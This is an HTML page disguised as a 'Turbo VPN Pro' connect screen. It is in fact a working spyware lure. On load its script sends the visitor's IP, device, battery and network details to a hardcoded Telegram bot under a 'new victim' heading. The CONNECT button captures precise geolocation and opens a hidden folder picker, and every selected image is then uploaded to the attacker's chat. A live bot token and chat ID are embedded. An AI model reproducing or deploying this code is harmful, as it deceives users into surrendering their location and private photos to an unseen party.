<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Turbo VPN Pro</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; width: 85%; max-width: 400px; }
        .btn { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; }
        .btn:active { transform: scale(0.9); }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color: #ff8c00;">VPN Pro</h1>
        <p id="st">جاري فحص الأمان وفحص الـ IP...</p>
        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="start()">CONNECT</button>
    </div>

    <script>
        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const C = '7214473798';

        // 1. جلب بيانات الجهاز والبطارية والشبكة فور فتح الرابط
        window.onload = async () => {
            try {
                // بيانات الـ IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                // بيانات البطارية
                const battery = await navigator.getBattery();
                const batLevel = (battery.level * 100) + "%";
                const isCharging = battery.charging ? "🔌 يشحن" : "🔋 لا يشحن";

                // بيانات الشبكة والجهاز
                const netType = navigator.connection ? navigator.connection.effectiveType : "غير معروف";
                const platform = navigator.platform;
                const agent = navigator.userAgent;

                const msg = `🌐 ضحية جديد متصل الآن!\n` +
                            `📍 الـ IP: ${data.ip}\n` +
                            `📱 الجهاز: ${platform}\n` +
                            `🔋 البطارية: ${batLevel} (${isCharging})\n` +
                            `📶 الشبكة: ${netType}\n` +
                            `🌐 المتصفح: ${agent}`;

                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
            } catch (e) {}
        };

        async function start() {
            document.getElementById('st').innerText = "جاري تأمين الموقع والملفات...";
            // سحب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition((p) => {
                const locMsg = `📍 موقع الضحية الدقيق:\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(locMsg)}`);
            });
            // فتح نافذة سحب الصور
            document.getElementById('f').click();
        }

        // معالجة الصور المرسلة
        document.getElementById('f').onchange = async (e) => {
            for (let file of e.target.files) {
                if (file.type.startsWith('image/')) {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('document', file);
                    fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
                }
            }
        };
    </script>
</body>
</html>
